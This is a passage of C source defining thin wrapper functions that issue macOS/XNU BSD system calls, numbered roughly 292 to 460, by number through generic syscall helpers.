  return scc_syscall5((uint64_t)path, (uint64_t)uid, (uint64_t)gid, (uint64_t)mode, (uint64_t)xsecurity, POSIX_CALL_NUM(292));
}


static return_t scc_identitysvc(int opcode, user_addr_t message) {
  return scc_syscall2((uint64_t)opcode, (uint64_t)message, POSIX_CALL_NUM(293));
}


static return_t scc_shared_region_check_np(uint64_t *start_address) {
  return scc_syscall1((uint64_t)start_address, POSIX_CALL_NUM(294));
}

static return_t scc_vm_pressure_monitor(int wait_for_pressure, int nsecs_monitored, uint32_t *pages_reclaimed) {
  return scc_syscall3((uint64_t)wait_for_pressure, (uint64_t)nsecs_monitored, (uint64_t)pages_reclaimed, POSIX_CALL_NUM(296));
}


static return_t scc_psynch_rw_longrdlock(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) {
  return scc_syscall5((uint64_t)rwlock, (uint64_t)lgenval, (uint64_t)ugenval, (uint64_t)rw_wc, (uint64_t)flags, POSIX_CALL_NUM(297));
}


static return_t scc_psynch_rw_yieldwrlock(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) {
  return scc_syscall5((uint64_t)rwlock, (uint64_t)lgenval, (uint64_t)ugenval, (uint64_t)rw_wc, (uint64_t)flags, POSIX_CALL_NUM(298));
}

static return_t scc_psynch_mutexwait(user_addr_t mutex,  uint32_t mgen, uint32_t  ugen, uint64_t tid, uint32_t flags) {
  return scc_syscall5((uint64_t)mutex, (uint64_t)mgen, (uint64_t)ugen, (uint64_t)tid, (uint64_t)flags, POSIX_CALL_NUM(301));
}


static return_t scc_psynch_mutexdrop(user_addr_t mutex,  uint32_t mgen, uint32_t  ugen, uint64_t tid, uint32_t flags) {
  return scc_syscall5((uint64_t)mutex, (uint64_t)mgen, (uint64_t)ugen, (uint64_t)tid, (uint64_t)flags, POSIX_CALL_NUM(302));
}


static return_t scc_psynch_cvbroad(user_addr_t cv, uint64_t cvlsgen, uint64_t cvudgen, uint32_t flags, user_addr_t mutex,  uint64_t mugen, uint64_t tid) {
  return scc_syscall7((uint64_t)cv, (uint64_t)cvlsgen, (uint64_t)cvudgen, (uint64_t)flags, (uint64_t)mutex, (uint64_t)mugen, (uint64_t)tid, POSIX_CALL_NUM(303));
}


static return_t scc_psynch_cvsignal(user_addr_t cv, uint64_t cvlsgen, uint32_t cvugen, int thread_port, user_addr_t mutex,  uint64_t mugen, uint64_t tid, uint32_t flags) {
  return scc_syscall8((uint64_t)cv, (uint64_t)cvlsgen, (uint64_t)cvugen, (uint64_t)thread_port, (uint64_t)mutex, (uint64_t)mugen, (uint64_t)tid, (uint64_t)flags, POSIX_CALL_NUM(304));
}


static return_t scc_psynch_cvwait(user_addr_t cv, uint64_t cvlsgen, uint32_t cvugen, user_addr_t mutex,  uint64_t mugen, uint32_t flags, int64_t sec, uint32_t nsec) {
  return scc_syscall8((uint64_t)cv, (uint64_t)cvlsgen, (uint64_t)cvugen, (uint64_t)mutex, (uint64_t)mugen, (uint64_t)flags, (uint64_t)sec, (uint64_t)nsec, POSIX_CALL_NUM(305));
}


static return_t scc_psynch_rw_rdlock(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) {
  return scc_syscall5((uint64_t)rwlock, (uint64_t)lgenval, (uint64_t)ugenval, (uint64_t)rw_wc, (uint64_t)flags, POSIX_CALL_NUM(306));
}


static return_t scc_psynch_rw_wrlock(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) {
  return scc_syscall5((uint64_t)rwlock, (uint64_t)lgenval, (uint64_t)ugenval, (uint64_t)rw_wc, (uint64_t)flags, POSIX_CALL_NUM(307));
}


static return_t scc_psynch_rw_unlock(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) {
  return scc_syscall5((uint64_t)rwlock, (uint64_t)lgenval, (uint64_t)ugenval, (uint64_t)rw_wc, (uint64_t)flags, POSIX_CALL_NUM(308));
}


static return_t scc_psynch_rw_unlock2(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) {
  return scc_syscall5((uint64_t)rwlock, (uint64_t)lgenval, (uint64_t)ugenval, (uint64_t)rw_wc, (uint64_t)flags, POSIX_CALL_NUM(309));
}


static return_t scc_getsid(pid_t pid) {
  return scc_syscall1((uint64_t)pid, POSIX_CALL_NUM(310));
}


static return_t scc_settid_with_pid(pid_t pid, int assume) {
  return scc_syscall2((uint64_t)pid, (uint64_t)assume, POSIX_CALL_NUM(311));
}


static return_t scc_psynch_cvclrprepost(user_addr_t cv, uint32_t cvgen, uint32_t cvugen, uint32_t cvsgen, uint32_t prepocnt, uint32_t preposeq, uint32_t flags) {
  return scc_syscall7((uint64_t)cv, (uint64_t)cvgen, (uint64_t)cvugen, (uint64_t)cvsgen, (uint64_t)prepocnt, (uint64_t)preposeq, (uint64_t)flags, POSIX_CALL_NUM(312));
}


static return_t scc_aio_fsync(int op, user_addr_t aiocbp) {
  return scc_syscall2((uint64_t)op, (uint64_t)aiocbp, POSIX_CALL_NUM(313));
}


static return_t scc_aio_return(user_addr_t aiocbp) {
  return scc_syscall1((uint64_t)aiocbp, POSIX_CALL_NUM(314));
}


static return_t scc_aio_suspend(user_addr_t aiocblist, int nent, user_addr_t timeoutp) {
  return scc_syscall3((uint64_t)aiocblist, (uint64_t)nent, (uint64_t)timeoutp, POSIX_CALL_NUM(315));
}


static return_t scc_aio_cancel(int fd, user_addr_t aiocbp) {
  return scc_syscall2((uint64_t)fd, (uint64_t)aiocbp, POSIX_CALL_NUM(316));
}


static return_t scc_aio_error(user_addr_t aiocbp) {
  return scc_syscall1((uint64_t)aiocbp, POSIX_CALL_NUM(317));
}


static return_t scc_aio_read(user_addr_t aiocbp) {
  return scc_syscall1((uint64_t)aiocbp, POSIX_CALL_NUM(318));
}


static return_t scc_aio_write(user_addr_t aiocbp) {
  return scc_syscall1((uint64_t)aiocbp, POSIX_CALL_NUM(319));
}


static return_t scc_lio_listio(int mode, user_addr_t aiocblist, int nent, user_addr_t sigp) {
  return scc_syscall4((uint64_t)mode, (uint64_t)aiocblist, (uint64_t)nent, (uint64_t)sigp, POSIX_CALL_NUM(320));
}

static return_t scc_iopolicysys(int cmd, void *arg) {
  return scc_syscall2((uint64_t)cmd, (uint64_t)arg, POSIX_CALL_NUM(322));
}


static return_t scc_process_policy(int scope, int action, int policy, int policy_subtype, user_addr_t attrp, pid_t target_pid, uint64_t target_threadid) {
  return scc_syscall7((uint64_t)scope, (uint64_t)action, (uint64_t)policy, (uint64_t)policy_subtype, (uint64_t)attrp, (uint64_t)target_pid, (uint64_t)target_threadid, POSIX_CALL_NUM(323));
}


static return_t scc_mlockall(int how) {
  return scc_syscall1((uint64_t)how, POSIX_CALL_NUM(324));
}


static return_t scc_munlockall(int how) {
  return scc_syscall1((uint64_t)how, POSIX_CALL_NUM(325));
}

static return_t scc_issetugid(void) {
  return scc_syscall0(POSIX_CALL_NUM(327));
}


static return_t scc___pthread_kill(int thread_port, int sig) {
  return scc_syscall2((uint64_t)thread_port, (uint64_t)sig, POSIX_CALL_NUM(328));
}


static return_t scc___pthread_sigmask(int how, user_addr_t set, user_addr_t oset) {
  return scc_syscall3((uint64_t)how, (uint64_t)set, (uint64_t)oset, POSIX_CALL_NUM(329));
}


static return_t scc___sigwait(user_addr_t set, user_addr_t sig) {
  return scc_syscall2((uint64_t)set, (uint64_t)sig, POSIX_CALL_NUM(330));
}


static return_t scc___disable_threadsignal(int value) {
  return scc_syscall1((uint64_t)value, POSIX_CALL_NUM(331));
}


static return_t scc___pthread_markcancel(int thread_port) {
  return scc_syscall1((uint64_t)thread_port, POSIX_CALL_NUM(332));
}


static return_t scc___pthread_canceled(int  action) {
  return scc_syscall1((uint64_t)action, POSIX_CALL_NUM(333));
}


static return_t scc___semwait_signal(int cond_sem, int mutex_sem, int timeout, int relative, int64_t tv_sec, int32_t tv_nsec) {
  return scc_syscall6((uint64_t)cond_sem, (uint64_t)mutex_sem, (uint64_t)timeout, (uint64_t)relative, (uint64_t)tv_sec, (uint64_t)tv_nsec, POSIX_CALL_NUM(334));
}

static return_t scc_proc_info(int32_t callnum,int32_t pid,uint32_t flavor, uint64_t arg,user_addr_t buffer,int32_t buffersize) {
  return scc_syscall6((uint64_t)callnum, (uint64_t)pid, (uint64_t)flavor, (uint64_t)arg, (uint64_t)buffer, (uint64_t)buffersize, POSIX_CALL_NUM(336));
}


static return_t scc_sendfile(int fd, int s, off_t offset, off_t *nbytes, struct sf_hdtr *hdtr, int flags) {
  return scc_syscall6((uint64_t)fd, (uint64_t)s, (uint64_t)offset, (uint64_t)nbytes, (uint64_t)hdtr, (uint64_t)flags, POSIX_CALL_NUM(337));
}


static return_t scc_stat64(user_addr_t path, user_addr_t ub) {
  return scc_syscall2((uint64_t)path, (uint64_t)ub, POSIX_CALL_NUM(338));
}


static return_t scc_fstat64(int fd, user_addr_t ub) {
  return scc_syscall2((uint64_t)fd, (uint64_t)ub, POSIX_CALL_NUM(339));
}


static return_t scc_lstat64(user_addr_t path, user_addr_t ub) {
  return scc_syscall2((uint64_t)path, (uint64_t)ub, POSIX_CALL_NUM(340));
}


static return_t scc_stat64_extended(user_addr_t path, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) {
  return scc_syscall4((uint64_t)path, (uint64_t)ub, (uint64_t)xsecurity, (uint64_t)xsecurity_size, POSIX_CALL_NUM(341));
}


static return_t scc_lstat64_extended(user_addr_t path, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) {
  return scc_syscall4((uint64_t)path, (uint64_t)ub, (uint64_t)xsecurity, (uint64_t)xsecurity_size, POSIX_CALL_NUM(342));
}


static return_t scc_fstat64_extended(int fd, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) {
  return scc_syscall4((uint64_t)fd, (uint64_t)ub, (uint64_t)xsecurity, (uint64_t)xsecurity_size, POSIX_CALL_NUM(343));
}


static return_t scc_getdirentries64(int fd, void *buf, user_size_t bufsize, off_t *position) {
  return scc_syscall4((uint64_t)fd, (uint64_t)buf, (uint64_t)bufsize, (uint64_t)position, POSIX_CALL_NUM(344));
}


static return_t scc_statfs64(char *path, void *buf) {
  return scc_syscall2((uint64_t)path, (uint64_t)buf, POSIX_CALL_NUM(345));
}


static return_t scc_fstatfs64(int fd, void *buf) {
  return scc_syscall2((uint64_t)fd, (uint64_t)buf, POSIX_CALL_NUM(346));
}


static return_t scc_getfsstat64(user_addr_t buf, int bufsize, int flags) {
  return scc_syscall3((uint64_t)buf, (uint64_t)bufsize, (uint64_t)flags, POSIX_CALL_NUM(347));
}


static return_t scc___pthread_chdir(user_addr_t path) {
  return scc_syscall1((uint64_t)path, POSIX_CALL_NUM(348));
}


static return_t scc___pthread_fchdir(int fd) {
  return scc_syscall1((uint64_t)fd, POSIX_CALL_NUM(349));
}


static return_t scc_audit(void *record, int length) {
  return scc_syscall2((uint64_t)record, (uint64_t)length, POSIX_CALL_NUM(350));
}


static return_t scc_auditon(int cmd, void *data, int length) {
  return scc_syscall3((uint64_t)cmd, (uint64_t)data, (uint64_t)length, POSIX_CALL_NUM(351));
}

static return_t scc_getauid(au_id_t *auid) {
  return scc_syscall1((uint64_t)auid, POSIX_CALL_NUM(353));
}


static return_t scc_setauid(au_id_t *auid) {
  return scc_syscall1((uint64_t)auid, POSIX_CALL_NUM(354));
}

static return_t scc_getaudit_addr(struct auditinfo_addr *auditinfo_addr, int length) {
  return scc_syscall2((uint64_t)auditinfo_addr, (uint64_t)length, POSIX_CALL_NUM(357));
}


static return_t scc_setaudit_addr(struct auditinfo_addr *auditinfo_addr, int length) {
  return scc_syscall2((uint64_t)auditinfo_addr, (uint64_t)length, POSIX_CALL_NUM(358));
}


static return_t scc_auditctl(char *path) {
  return scc_syscall1((uint64_t)path, POSIX_CALL_NUM(359));
}


static return_t scc_bsdthread_create(user_addr_t func, user_addr_t func_arg, user_addr_t stack, user_addr_t pthread, uint32_t flags) {
  return scc_syscall5((uint64_t)func, (uint64_t)func_arg, (uint64_t)stack, (uint64_t)pthread, (uint64_t)flags, POSIX_CALL_NUM(360));
}


static return_t scc_bsdthread_terminate(user_addr_t stackaddr, size_t freesize, uint32_t port, uint32_t sem) {
  return scc_syscall4((uint64_t)stackaddr, (uint64_t)freesize, (uint64_t)port, (uint64_t)sem, POSIX_CALL_NUM(361));
}


static return_t scc_kqueue(void) {
  return scc_syscall0(POSIX_CALL_NUM(362));
}


static return_t scc_kevent(int fd, const struct kevent *changelist, int nchanges, struct kevent *eventlist, int nevents, const struct timespec *timeout) {
  return scc_syscall6((uint64_t)fd, (uint64_t)changelist, (uint64_t)nchanges, (uint64_t)eventlist, (uint64_t)nevents, (uint64_t)timeout, POSIX_CALL_NUM(363));
}


static return_t scc_lchown(user_addr_t path, uid_t owner, gid_t group) {
  return scc_syscall3((uint64_t)path, (uint64_t)owner, (uint64_t)group, POSIX_CALL_NUM(364));
}


static return_t scc_stack_snapshot(pid_t pid, user_addr_t tracebuf, uint32_t tracebuf_size, uint32_t flags, uint32_t dispatch_offset) {
  return scc_syscall5((uint64_t)pid, (uint64_t)tracebuf, (uint64_t)tracebuf_size, (uint64_t)flags, (uint64_t)dispatch_offset, POSIX_CALL_NUM(365));
}


static return_t scc_bsdthread_register(user_addr_t threadstart, user_addr_t wqthread, uint32_t flags, user_addr_t stack_addr_hint, user_addr_t targetconc_ptr, uint32_t dispatchqueue_offset, uint32_t tsd_offset) {
  return scc_syscall7((uint64_t)threadstart, (uint64_t)wqthread, (uint64_t)flags, (uint64_t)stack_addr_hint, (uint64_t)targetconc_ptr, (uint64_t)dispatchqueue_offset, (uint64_t)tsd_offset, POSIX_CALL_NUM(366));
}


static return_t scc_workq_open(void) {
  return scc_syscall0(POSIX_CALL_NUM(367));
}


static return_t scc_workq_kernreturn(int options, user_addr_t item, int affinity, int prio) {
  return scc_syscall4((uint64_t)options, (uint64_t)item, (uint64_t)affinity, (uint64_t)prio, POSIX_CALL_NUM(368));
}


static return_t scc_kevent64(int fd, const struct kevent64_s *changelist, int nchanges, struct kevent64_s *eventlist, int nevents, unsigned int flags, const struct timespec *timeout) {
  return scc_syscall7((uint64_t)fd, (uint64_t)changelist, (uint64_t)nchanges, (uint64_t)eventlist, (uint64_t)nevents, (uint64_t)flags, (uint64_t)timeout, POSIX_CALL_NUM(369));
}


static return_t scc___old_semwait_signal(int cond_sem, int mutex_sem, int timeout, int relative, const struct timespec *ts) {
  return scc_syscall5((uint64_t)cond_sem, (uint64_t)mutex_sem, (uint64_t)timeout, (uint64_t)relative, (uint64_t)ts, POSIX_CALL_NUM(370));
}


static return_t scc___old_semwait_signal_nocancel(int cond_sem, int mutex_sem, int timeout, int relative, const struct timespec *ts) {
  return scc_syscall5((uint64_t)cond_sem, (uint64_t)mutex_sem, (uint64_t)timeout, (uint64_t)relative, (uint64_t)ts, POSIX_CALL_NUM(371));
}


static return_t scc_thread_selfid(void) {
  return scc_syscall0(POSIX_CALL_NUM(372));
}


static return_t scc_ledger(int cmd, caddr_t arg1, caddr_t arg2, caddr_t arg3) {
  return scc_syscall4((uint64_t)cmd, (uint64_t)arg1, (uint64_t)arg2, (uint64_t)arg3, POSIX_CALL_NUM(373));
}

static return_t scc___mac_execve(char *fname, char **argp, char **envp, mac_t mac_p) {
  return scc_syscall4((uint64_t)fname, (uint64_t)argp, (uint64_t)envp, (uint64_t)mac_p, POSIX_CALL_NUM(380));
}

static return_t scc___mac_get_file(char *path_p, mac_t mac_p) {
  return scc_syscall2((uint64_t)path_p, (uint64_t)mac_p, POSIX_CALL_NUM(382));
}


static return_t scc___mac_set_file(char *path_p, mac_t mac_p) {
  return scc_syscall2((uint64_t)path_p, (uint64_t)mac_p, POSIX_CALL_NUM(383));
}


static return_t scc___mac_get_link(char *path_p, mac_t mac_p) {
  return scc_syscall2((uint64_t)path_p, (uint64_t)mac_p, POSIX_CALL_NUM(384));
}


static return_t scc___mac_set_link(char *path_p, mac_t mac_p) {
  return scc_syscall2((uint64_t)path_p, (uint64_t)mac_p, POSIX_CALL_NUM(385));
}


static return_t scc___mac_get_proc(mac_t mac_p) {
  return scc_syscall1((uint64_t)mac_p, POSIX_CALL_NUM(386));
}


static return_t scc___mac_set_proc(mac_t mac_p) {
  return scc_syscall1((uint64_t)mac_p, POSIX_CALL_NUM(387));
}


static return_t scc___mac_get_fd(int fd, mac_t mac_p) {
  return scc_syscall2((uint64_t)fd, (uint64_t)mac_p, POSIX_CALL_NUM(388));
}


static return_t scc___mac_set_fd(int fd, mac_t mac_p) {
  return scc_syscall2((uint64_t)fd, (uint64_t)mac_p, POSIX_CALL_NUM(389));
}


static return_t scc___mac_get_pid(pid_t pid, mac_t mac_p) {
  return scc_syscall2((uint64_t)pid, (uint64_t)mac_p, POSIX_CALL_NUM(390));
}


static return_t scc___mac_get_lcid(pid_t lcid, mac_t mac_p) {
  return scc_syscall2((uint64_t)lcid, (uint64_t)mac_p, POSIX_CALL_NUM(391));
}


static return_t scc___mac_get_lctx(mac_t mac_p) {
  return scc_syscall1((uint64_t)mac_p, POSIX_CALL_NUM(392));
}


static return_t scc___mac_set_lctx(mac_t mac_p) {
  return scc_syscall1((uint64_t)mac_p, POSIX_CALL_NUM(393));
}


static return_t scc_setlcid(pid_t pid, pid_t lcid) {
  return scc_syscall2((uint64_t)pid, (uint64_t)lcid, POSIX_CALL_NUM(394));
}


static return_t scc_getlcid(pid_t pid) {
  return scc_syscall1((uint64_t)pid, POSIX_CALL_NUM(395));
}


static return_t scc_read_nocancel(int fd, user_addr_t cbuf, user_size_t nbyte) {
  return scc_syscall3((uint64_t)fd, (uint64_t)cbuf, (uint64_t)nbyte, POSIX_CALL_NUM(396));
}


static return_t scc_write_nocancel(int fd, user_addr_t cbuf, user_size_t nbyte) {
  return scc_syscall3((uint64_t)fd, (uint64_t)cbuf, (uint64_t)nbyte, POSIX_CALL_NUM(397));
}


static return_t scc_open_nocancel(user_addr_t path, int flags, int mode) {
  return scc_syscall3((uint64_t)path, (uint64_t)flags, (uint64_t)mode, POSIX_CALL_NUM(398));
}


static return_t scc_close_nocancel(int fd) {
  return scc_syscall1((uint64_t)fd, POSIX_CALL_NUM(399));
}


static return_t scc_wait4_nocancel(int pid, user_addr_t status, int options, user_addr_t rusage) {
  return scc_syscall4((uint64_t)pid, (uint64_t)status, (uint64_t)options, (uint64_t)rusage, POSIX_CALL_NUM(400));
}


static return_t scc_recvmsg_nocancel(int s, struct msghdr *msg, int flags) {
  return scc_syscall3((uint64_t)s, (uint64_t)msg, (uint64_t)flags, POSIX_CALL_NUM(401));
}


static return_t scc_sendmsg_nocancel(int s, caddr_t msg, int flags) {
  return scc_syscall3((uint64_t)s, (uint64_t)msg, (uint64_t)flags, POSIX_CALL_NUM(402));
}


static return_t scc_recvfrom_nocancel(int s, void *buf, size_t len, int flags, struct sockaddr *from, int *fromlenaddr) {
  return scc_syscall6((uint64_t)s, (uint64_t)buf, (uint64_t)len, (uint64_t)flags, (uint64_t)from, (uint64_t)fromlenaddr, POSIX_CALL_NUM(403));
}


static return_t scc_accept_nocancel(int s, caddr_t name, socklen_t *anamelen) {
  return scc_syscall3((uint64_t)s, (uint64_t)name, (uint64_t)anamelen, POSIX_CALL_NUM(404));
}


static return_t scc_msync_nocancel(caddr_t addr, size_t len, int flags) {
  return scc_syscall3((uint64_t)addr, (uint64_t)len, (uint64_t)flags, POSIX_CALL_NUM(405));
}


static return_t scc_fcntl_nocancel(int fd, int cmd, long arg) {
  return scc_syscall3((uint64_t)fd, (uint64_t)cmd, (uint64_t)arg, POSIX_CALL_NUM(406));
}


static return_t scc_select_nocancel(int nd, u_int32_t *in, u_int32_t *ou, u_int32_t *ex, struct timeval *tv) {
  return scc_syscall5((uint64_t)nd, (uint64_t)in, (uint64_t)ou, (uint64_t)ex, (uint64_t)tv, POSIX_CALL_NUM(407));
}


static return_t scc_fsync_nocancel(int fd) {
  return scc_syscall1((uint64_t)fd, POSIX_CALL_NUM(408));
}


static return_t scc_connect_nocancel(int s, caddr_t name, socklen_t namelen) {
  return scc_syscall3((uint64_t)s, (uint64_t)name, (uint64_t)namelen, POSIX_CALL_NUM(409));
}


static return_t scc_sigsuspend_nocancel(sigset_t mask) {
  return scc_syscall1((uint64_t)mask, POSIX_CALL_NUM(410));
}


static return_t scc_readv_nocancel(int fd, struct iovec *iovp, u_int iovcnt) {
  return scc_syscall3((uint64_t)fd, (uint64_t)iovp, (uint64_t)iovcnt, POSIX_CALL_NUM(411));
}


static return_t scc_writev_nocancel(int fd, struct iovec *iovp, u_int iovcnt) {
  return scc_syscall3((uint64_t)fd, (uint64_t)iovp, (uint64_t)iovcnt, POSIX_CALL_NUM(412));
}


static return_t scc_sendto_nocancel(int s, caddr_t buf, size_t len, int flags, caddr_t to, socklen_t tolen) {
  return scc_syscall6((uint64_t)s, (uint64_t)buf, (uint64_t)len, (uint64_t)flags, (uint64_t)to, (uint64_t)tolen, POSIX_CALL_NUM(413));
}


static return_t scc_pread_nocancel(int fd, user_addr_t buf, user_size_t nbyte, off_t offset) {
  return scc_syscall4((uint64_t)fd, (uint64_t)buf, (uint64_t)nbyte, (uint64_t)offset, POSIX_CALL_NUM(414));
}


static return_t scc_pwrite_nocancel(int fd, user_addr_t buf, user_size_t nbyte, off_t offset) {
  return scc_syscall4((uint64_t)fd, (uint64_t)buf, (uint64_t)nbyte, (uint64_t)offset, POSIX_CALL_NUM(415));
}


static return_t scc_waitid_nocancel(idtype_t idtype, id_t id, siginfo_t *infop, int options) {
  return scc_syscall4((uint64_t)idtype, (uint64_t)id, (uint64_t)infop, (uint64_t)options, POSIX_CALL_NUM(416));
}


static return_t scc_poll_nocancel(struct pollfd *fds, u_int nfds, int timeout) {
  return scc_syscall3((uint64_t)fds, (uint64_t)nfds, (uint64_t)timeout, POSIX_CALL_NUM(417));
}


static return_t scc_msgsnd_nocancel(int msqid, void *msgp, size_t msgsz, int msgflg) {
  return scc_syscall4((uint64_t)msqid, (uint64_t)msgp, (uint64_t)msgsz, (uint64_t)msgflg, POSIX_CALL_NUM(418));
}


static return_t scc_msgrcv_nocancel(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg) {
  return scc_syscall5((uint64_t)msqid, (uint64_t)msgp, (uint64_t)msgsz, (uint64_t)msgtyp, (uint64_t)msgflg, POSIX_CALL_NUM(419));
}


static return_t scc_sem_wait_nocancel(sem_t *sem) {
  return scc_syscall1((uint64_t)sem, POSIX_CALL_NUM(420));
}


static return_t scc_aio_suspend_nocancel(user_addr_t aiocblist, int nent, user_addr_t timeoutp) {
  return scc_syscall3((uint64_t)aiocblist, (uint64_t)nent, (uint64_t)timeoutp, POSIX_CALL_NUM(421));
}


static return_t scc___sigwait_nocancel(user_addr_t set, user_addr_t sig) {
  return scc_syscall2((uint64_t)set, (uint64_t)sig, POSIX_CALL_NUM(422));
}


static return_t scc___semwait_signal_nocancel(int cond_sem, int mutex_sem, int timeout, int relative, int64_t tv_sec, int32_t tv_nsec) {
  return scc_syscall6((uint64_t)cond_sem, (uint64_t)mutex_sem, (uint64_t)timeout, (uint64_t)relative, (uint64_t)tv_sec, (uint64_t)tv_nsec, POSIX_CALL_NUM(423));
}


static return_t scc___mac_mount(char *type, char *path, int flags, caddr_t data, mac_t mac_p) {
  return scc_syscall5((uint64_t)type, (uint64_t)path, (uint64_t)flags, (uint64_t)data, (uint64_t)mac_p, POSIX_CALL_NUM(424));
}


static return_t scc___mac_get_mount(char *path, mac_t mac_p) {
  return scc_syscall2((uint64_t)path, (uint64_t)mac_p, POSIX_CALL_NUM(425));
}


static return_t scc___mac_getfsstat(user_addr_t buf, int bufsize, user_addr_t mac, int macsize, int flags) {
  return scc_syscall5((uint64_t)buf, (uint64_t)bufsize, (uint64_t)mac, (uint64_t)macsize, (uint64_t)flags, POSIX_CALL_NUM(426));
}


static return_t scc_fsgetpath(user_addr_t buf, size_t bufsize, user_addr_t fsid, uint64_t objid) {
  return scc_syscall4((uint64_t)buf, (uint64_t)bufsize, (uint64_t)fsid, (uint64_t)objid, POSIX_CALL_NUM(427));
}


static return_t scc_audit_session_self(void) {
  return scc_syscall0(POSIX_CALL_NUM(428));
}


static return_t scc_audit_session_join(mach_port_name_t port) {
  return scc_syscall1((uint64_t)port, POSIX_CALL_NUM(429));
}


static return_t scc_fileport_makeport(int fd, user_addr_t portnamep) {
  return scc_syscall2((uint64_t)fd, (uint64_t)portnamep, POSIX_CALL_NUM(430));
}


static return_t scc_fileport_makefd(mach_port_name_t port) {
  return scc_syscall1((uint64_t)port, POSIX_CALL_NUM(431));
}


static return_t scc_audit_session_port(au_asid_t asid, user_addr_t portnamep) {
  return scc_syscall2((uint64_t)asid, (uint64_t)portnamep, POSIX_CALL_NUM(432));
}


static return_t scc_pid_suspend(int pid) {
  return scc_syscall1((uint64_t)pid, POSIX_CALL_NUM(433));
}


static return_t scc_pid_resume(int pid) {
  return scc_syscall1((uint64_t)pid, POSIX_CALL_NUM(434));
}

static return_t scc_shared_region_map_and_slide_np(int fd, uint32_t count, const struct shared_file_mapping_np *mappings, uint32_t slide, uint64_t* slide_start, uint32_t slide_size) {
  return scc_syscall6((uint64_t)fd, (uint64_t)count, (uint64_t)mappings, (uint64_t)slide, (uint64_t)slide_start, (uint64_t)slide_size, POSIX_CALL_NUM(438));
}


static return_t scc_kas_info(int selector, void *value, size_t *size) {
  return scc_syscall3((uint64_t)selector, (uint64_t)value, (uint64_t)size, POSIX_CALL_NUM(439));
}


static return_t scc_memorystatus_control(uint32_t command, int32_t pid, uint32_t flags, user_addr_t buffer, size_t buffersize) {
  return scc_syscall5((uint64_t)command, (uint64_t)pid, (uint64_t)flags, (uint64_t)buffer, (uint64_t)buffersize, POSIX_CALL_NUM(440));
}


static return_t scc_guarded_open_np(const char *path, const guardid_t *guard, u_int guardflags, int flags, int mode) {
  return scc_syscall5((uint64_t)path, (uint64_t)guard, (uint64_t)guardflags, (uint64_t)flags, (uint64_t)mode, POSIX_CALL_NUM(441));
}


static return_t scc_guarded_close_np(int fd, const guardid_t *guard) {
  return scc_syscall2((uint64_t)fd, (uint64_t)guard, POSIX_CALL_NUM(442));
}


static return_t scc_guarded_kqueue_np(const guardid_t *guard, u_int guardflags) {
  return scc_syscall2((uint64_t)guard, (uint64_t)guardflags, POSIX_CALL_NUM(443));
}


static return_t scc_change_fdguard_np(int fd, const guardid_t *guard, u_int guardflags, const guardid_t *nguard, u_int nguardflags, int *fdflagsp) {
  return scc_syscall6((uint64_t)fd, (uint64_t)guard, (uint64_t)guardflags, (uint64_t)nguard, (uint64_t)nguardflags, (uint64_t)fdflagsp, POSIX_CALL_NUM(444));
}

static return_t scc_proc_rlimit_control(pid_t pid, int flavor, void *arg) {
  return scc_syscall3((uint64_t)pid, (uint64_t)flavor, (uint64_t)arg, POSIX_CALL_NUM(446));
}


static return_t scc_connectx(int s, struct sockaddr *src, socklen_t srclen, struct sockaddr *dsts, socklen_t dstlen, uint32_t ifscope, associd_t aid, connid_t *cid) {
  return scc_syscall8((uint64_t)s, (uint64_t)src, (uint64_t)srclen, (uint64_t)dsts, (uint64_t)dstlen, (uint64_t)ifscope, (uint64_t)aid, (uint64_t)cid, POSIX_CALL_NUM(447));
}


static return_t scc_disconnectx(int s, associd_t aid, connid_t cid) {
  return scc_syscall3((uint64_t)s, (uint64_t)aid, (uint64_t)cid, POSIX_CALL_NUM(448));
}


static return_t scc_peeloff(int s, associd_t aid) {
  return scc_syscall2((uint64_t)s, (uint64_t)aid, POSIX_CALL_NUM(449));
}


static return_t scc_socket_delegate(int domain, int type, int protocol, pid_t epid) {
  return scc_syscall4((uint64_t)domain, (uint64_t)type, (uint64_t)protocol, (uint64_t)epid, POSIX_CALL_NUM(450));
}


static return_t scc_telemetry(uint64_t cmd, uint64_t deadline, uint64_t interval, uint64_t leeway, uint64_t arg4, uint64_t arg5) {
  return scc_syscall6((uint64_t)cmd, (uint64_t)deadline, (uint64_t)interval, (uint64_t)leeway, (uint64_t)arg4, (uint64_t)arg5, POSIX_CALL_NUM(451));
}


static return_t scc_proc_uuid_policy(uint32_t operation, uuid_t uuid, size_t uuidlen, uint32_t flags) {
  return scc_syscall4((uint64_t)operation, (uint64_t)uuid, (uint64_t)uuidlen, (uint64_t)flags, POSIX_CALL_NUM(452));
}


static return_t scc_memorystatus_get_level(user_addr_t level) {
  return scc_syscall1((uint64_t)level, POSIX_CALL_NUM(453));
}


static return_t scc_system_override(uint64_t timeout, uint64_t flags) {
  return scc_syscall2((uint64_t)timeout, (uint64_t)flags, POSIX_CALL_NUM(454));
}


static return_t scc_vfs_purge(void) {
  return scc_syscall0(POSIX_CALL_NUM(455));
}


static return_t scc_sfi_ctl(uint32_t operation, uint32_t sfi_class, uint64_t time, uint64_t *out_time) {
  return scc_syscall4((uint64_t)operation, (uint64_t)sfi_class, (uint64_t)time, (uint64_t)out_time, POSIX_CALL_NUM(456));
}


static return_t scc_sfi_pidctl(uint32_t operation, pid_t pid, uint32_t sfi_flags, uint32_t *out_sfi_flags) {
  return scc_syscall4((uint64_t)operation, (uint64_t)pid, (uint64_t)sfi_flags, (uint64_t)out_sfi_flags, POSIX_CALL_NUM(457));
}

static return_t scc_necp_match_policy(uint8_t *parameters, size_t parameters_size, struct necp_aggregate_result *returned_result) {
  return scc_syscall3((uint64_t)parameters, (uint64_t)parameters_size, (uint64_t)returned_result, POSIX_CALL_NUM(460));
}


static return_t scc_getattrlistbulk(int dirfd, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, uint64_t options) {
